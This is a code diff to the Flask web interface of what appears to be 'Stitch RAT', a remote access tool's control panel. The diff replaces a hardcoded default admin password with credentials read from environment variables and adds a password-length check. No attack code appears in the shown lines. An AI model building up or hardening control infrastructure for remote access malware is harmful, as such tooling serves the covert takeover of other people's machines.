@@ -15,6 +15,14 @@ from datetime import datetime, timedelta
 from collections import defaultdict
 from functools import wraps
 
+# Load environment variables from .env file if it exists
+try:
+    from dotenv import load_dotenv
+    load_dotenv()
+except ImportError:
+    # python-dotenv not installed, environment variables must be set manually
+    pass
+
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash
 from flask_socketio import SocketIO, emit
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -53,10 +61,58 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 # ============================================================================
 # Global State
 # ============================================================================
-USERS = {'admin': generate_password_hash('stitch2024')}
 command_history = []
 debug_logs = []
 login_attempts = defaultdict(list)
+
+# Load credentials from environment variables
+def load_credentials():
+    """
+    Load admin credentials from environment variables.
+    Raises RuntimeError if credentials are not configured.
+    """
+    username = os.getenv('STITCH_ADMIN_USER')
+    password = os.getenv('STITCH_ADMIN_PASSWORD')
+    
+    if not username or not password:
+        error_msg = """
+╔═══════════════════════════════════════════════════════════════════════╗
+║                     CREDENTIALS NOT CONFIGURED                        ║
+╚═══════════════════════════════════════════════════════════════════════╝
+
+ERROR: Admin credentials must be configured before starting Stitch.
+
+Please set the following environment variables:
+  - STITCH_ADMIN_USER     (your admin username)
+  - STITCH_ADMIN_PASSWORD (your admin password)
+
+Example (Linux/macOS):
+  export STITCH_ADMIN_USER="yourusername"
+  export STITCH_ADMIN_PASSWORD="YourSecurePassword123!"
+  python3 web_app_real.py
+
+Example (Windows):
+  set STITCH_ADMIN_USER=yourusername
+  set STITCH_ADMIN_PASSWORD=YourSecurePassword123!
+  python web_app_real.py
+
+Or create a .env file (see .env.example for template)
+
+Security Note: Never use default credentials in production!
+"""
+        raise RuntimeError(error_msg)
+    
+    # Validate password strength
+    if len(password) < 12:
+        raise RuntimeError(
+            "ERROR: Password must be at least 12 characters long for security.\n"
+            "Please set a stronger STITCH_ADMIN_PASSWORD."
+        )
+    
+    return {username: generate_password_hash(password)}
+
+# Initialize users (will be loaded at startup)
+USERS = {}
 
 # ============================================================================
 # Helper Functions
@@ -554,8 +610,19 @@ def start_stitch_server():
 # Main
 # ============================================================================
 if __name__ == '__main__':
+    print("\n" + "="*75)
+    print("🔐 Stitch RAT - Secure Web Interface")
+    print("="*75 + "\n")
+    
+    # Load and validate credentials before starting
+    try:
+        USERS = load_credentials()
+        log_debug("✓ Credentials loaded from environment variables", "INFO", "Security")
+    except RuntimeError as e:
+        print(str(e))
+        sys.exit(1)
+    
     log_debug("Starting Stitch Web Interface (Real Integration)", "INFO", "System")
-    log_debug("Default credentials - admin/stitch2024", "WARNING", "Security")
     
     # Start Stitch server in background
     stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
